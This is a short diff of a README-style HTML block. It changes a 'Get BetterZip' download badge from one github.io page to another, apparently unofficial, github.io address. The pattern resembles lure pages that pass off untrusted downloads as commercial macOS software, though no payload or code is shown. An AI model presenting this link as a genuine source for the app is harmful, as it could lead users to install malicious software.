@@ -5,7 +5,7 @@
 </div> 
 
 <div align="center">  
-<a href="https://macos-25.github.io/.github/">  
+<a href="https://osx-app.github.io/.github/betterzip">  
 <img src="https://img.shields.io/badge/⬇️_Get_BetterZip-blue?style=for-the-badge&logo=apple" alt="Get BetterZip">  
 </a>  
 </div>  
